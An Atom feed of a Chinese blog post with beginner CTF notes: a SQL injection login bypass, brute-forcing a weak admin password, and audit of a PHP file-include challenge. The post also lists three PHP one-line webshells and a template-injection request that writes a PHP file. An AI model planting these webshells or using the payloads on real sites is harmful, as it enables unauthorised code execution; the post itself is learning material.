<?xml version="1.0"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>http://example.com</id>
    <title>Tolalal&#39;s Blog</title>
    <subtitle>Welcome to my blog!</subtitle>
    <icon>http://example.com/images/favicon.ico</icon>
    <link href="http://example.com" />
    <author>
      <name>Tolalal</name>
    </author>
    <updated>2022-09-21T14:52:24.722Z</updated>
    <entry>
        <id>http://example.com/2022/09/21/CTF%E9%A2%98%E7%9B%AE%E7%AC%94%E8%AE%B0/</id>
        <title>CTF题目笔记</title>
        <link rel="alternate" href="http://example.com/2022/09/21/CTF%E9%A2%98%E7%9B%AE%E7%AC%94%E8%AE%B0/"/>
        <content type="html">&lt;h1 id=&#34;ctf题目笔记&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#ctf题目笔记&#34;&gt;#&lt;/a&gt; CTF 题目笔记&lt;/h1&gt;
&lt;h2 id=&#34;sql注入&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#sql注入&#34;&gt;#&lt;/a&gt; SQL 注入&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;登录处使用 findadmin 方法&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&#39;or 1=1--&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;在 SQL 语句中 username=’username‘ and password=’password‘&lt;/p&gt;
&lt;p&gt;变成了 username=’ ’ or 1=1--  ’ and password=’password‘&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;称为 SQL 注释&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;img data-src=&#34;https://evefortosaber.github.io/Open-pictures/SQL%E6%B3%A8%E5%85%A5%E4%B8%8D%E5%90%8C%E6%95%B0%E6%8D%AE%E5%BA%93.png&#34; alt=&#34;SQL&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Cookie 注入、Post 注入、盲注&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;blockquote&gt;
&lt;p&gt;做了 cookie，直接进 cookie 的 php 页面然后抓 cookie.php 的包，&lt;/p&gt;
&lt;p&gt;然后在 reapter 里看回显。拿到 flag。&lt;/p&gt;
&lt;p&gt;还做了一道&lt;strong&gt; baby_web&lt;/strong&gt;，直接根据提示进 index.php（这里主要是&lt;/p&gt;
&lt;p&gt;不知道 index 是什么（&lt;strong&gt;index.php 是首页&lt;/strong&gt;））&lt;/p&gt;
&lt;p&gt;或者先抓个包，把 get 改成 index.php 然后 send，之后直接看 response 得到 flag。&lt;/p&gt;
&lt;p&gt;（其实都很简单主要是不会操作，基础太差）&lt;/p&gt;
&lt;p&gt;还有一道弱口令&lt;strong&gt; weak_auth&lt;/strong&gt; 就是简单的弱口令（最开始想直接注入（练练手，学了好几天 SQL 注入了）结果要盲注，不会！只能查怎么爆破了）&lt;/p&gt;
&lt;p&gt;最后用 burpsuite 爆破账号:admin&lt;/p&gt;
&lt;p&gt;密码：123456&lt;/p&gt;
&lt;p&gt;就真没想到这么 weak！！&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3 id=&#34;get_post&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#get_post&#34;&gt;#&lt;/a&gt; get_post&lt;/h3&gt;
&lt;p&gt;可以通过 url 进行 get 操作，通过 hackbar 的 postpage 进行 post 操作&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://evefortosaber.github.io/Open-pictures/get_post.png&#34; alt=&#34;11&#34; /&gt;&lt;/p&gt;
&lt;h3 id=&#34;backup&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#backup&#34;&gt;#&lt;/a&gt; backup&lt;/h3&gt;
&lt;p&gt;注意源码泄露问题。&lt;/p&gt;
&lt;p&gt;可用脚本 dirsearch 进行目录扫描。&lt;/p&gt;
&lt;h3 id=&#34;warmup&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#warmup&#34;&gt;#&lt;/a&gt; warmup&lt;/h3&gt;
&lt;p&gt;代码审计&lt;/p&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;figcaption data-lang=&#34;PHP&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token php language-php&#34;&gt;&lt;span class=&#34;token delimiter important&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;token class-name-definition class-name&#34;&gt;emmm&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;static&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;token function-definition function&#34;&gt;checkFile&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$page&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;            &lt;span class=&#34;token variable&#34;&gt;$whitelist&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;source&#34;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&gt;&lt;/span&gt;&lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;source.php&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;hint&#34;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&gt;&lt;/span&gt;&lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;hint.php&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;            &lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;!&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;isset&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$page&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;||&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;!&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;is_string&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$page&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;                &lt;span class=&#34;token keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;you can&#39;t see it&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;                &lt;span class=&#34;token keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;token constant boolean&#34;&gt;false&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;10&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;            &lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;11&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;12&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;            &lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;in_array&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$page&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$whitelist&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;13&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;                &lt;span class=&#34;token keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;token constant boolean&#34;&gt;true&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;14&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;            &lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;15&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;16&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;            &lt;span class=&#34;token variable&#34;&gt;$_page&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;mb_substr&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;17&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;                &lt;span class=&#34;token variable&#34;&gt;$page&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;18&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;                &lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;19&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;                &lt;span class=&#34;token function&#34;&gt;mb_strpos&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$page&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;.&lt;/span&gt; &lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;?&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;?&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;20&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;            &lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;21&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;            &lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;in_array&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$_page&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$whitelist&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;22&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;                &lt;span class=&#34;token keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;token constant boolean&#34;&gt;true&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;23&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;            &lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;24&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;25&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;            &lt;span class=&#34;token variable&#34;&gt;$_page&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;urldecode&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$page&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;26&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;            &lt;span class=&#34;token variable&#34;&gt;$_page&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;mb_substr&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;27&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;                &lt;span class=&#34;token variable&#34;&gt;$_page&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;28&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;                &lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;29&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;                &lt;span class=&#34;token function&#34;&gt;mb_strpos&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$_page&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;.&lt;/span&gt; &lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;?&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;?&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;30&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;            &lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;31&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;            &lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;in_array&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$_page&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$whitelist&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;32&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;                &lt;span class=&#34;token keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;token constant boolean&#34;&gt;true&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;33&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;            &lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;34&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;            &lt;span class=&#34;token keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;you can&#39;t see it&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;35&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;            &lt;span class=&#34;token keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;token constant boolean&#34;&gt;false&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;36&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;37&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;38&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;39&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;!&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;empty&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$_REQUEST&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;file&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;40&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token operator&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;is_string&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$_REQUEST&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;file&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;41&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token operator&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&#34;token class-name static-context&#34;&gt;emmm&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;::&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;checkFile&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$_REQUEST&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;file&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;42&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;43&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token keyword&#34;&gt;include&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$_REQUEST&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;file&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;44&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token keyword&#34;&gt;exit&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;45&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;else&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;46&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;&amp;lt;br&gt;&amp;lt;img src=\&#34;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\&#34; /&gt;&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;47&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;  &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;48&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token delimiter important&#34;&gt;?&gt;&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;&lt;img data-src=&#34;https://evefortosaber.github.io/Open-pictures/warmup.png&#34; alt=&#34;aa&#34; /&gt;&lt;/p&gt;
&lt;p&gt;相关一句马&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&amp;lt;?php eval($_REQUEST[&#39;key&#39;]);?&amp;gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&amp;lt;?php system($_REQUEST[&#39;ab12&#39;]);?&amp;gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&amp;lt;?php eval($_POST[123]);?&amp;gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;webshell 分别为：key，ab12,123&lt;/p&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;figcaption data-lang=&#34;PHP&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;? a=fetch&amp;amp;templateFile=public/index&amp;amp;prefix=&#39;&#39;&amp;amp;content&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;lt;&lt;/span&gt;php&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&gt;&lt;/span&gt;&lt;/span&gt;file_put_contents(&#39;test.php&#39;,&#39;&lt;span class=&#34;token php language-php&#34;&gt;&lt;span class=&#34;token delimiter important&#34;&gt;&amp;lt;?php&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;phpinfo&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;token delimiter important&#34;&gt;?&gt;&lt;/span&gt;&lt;/span&gt;&#39;)&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;lt;/&lt;/span&gt;php&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;&lt;img data-src=&#34;https://evefortosaber.github.io/Open-pictures/yijian.png&#34; alt=&#34;yijian&#34; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://evefortosaber.github.io/Open-pictures/yijjian1.png&#34; alt=&#34;yijian1&#34; /&gt;&lt;/p&gt;
